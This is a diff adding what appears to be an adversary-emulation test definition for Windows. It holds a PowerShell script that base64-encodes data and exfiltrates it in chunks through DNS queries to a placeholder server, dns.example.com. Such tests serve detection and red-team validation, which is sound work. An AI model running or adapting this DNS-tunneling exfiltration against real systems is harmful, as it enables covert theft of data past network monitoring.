@@ -1,0 +1,23 @@
+Simulates an adversary using DNS tunneling to exfiltrate data over a Command and Control (C2) channel.
+
+Supported Platforms: Windows
+
+Inputs:
+Name	Description	Type	Default Value
+dns_server	DNS server IP address or domain name.	url	dns.example.com
+exfiltrated_data	Data to be exfiltrated.	string	SecretDataToExfiltrate
+chunk_size	Size of each DNS query chunk (in characters).	integer	63
+Attack Commands: Run with powershell!
+$dnsServer = "#{dns_server}"
+$exfiltratedData = "#{exfiltrated_data}"
+$chunkSize = #{chunk_size}
+
+$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
+$encodedData = [Convert]::ToBase64String($encodedData)
+$chunks = $encodedData -split "(.{$chunkSize})"
+
+foreach ($chunk in $chunks) {
+    $dnsQuery = $chunk + "." + $dnsServer
+    Resolve-DnsName -Name $dnsQuery
+    Start-Sleep -Seconds 5
+}
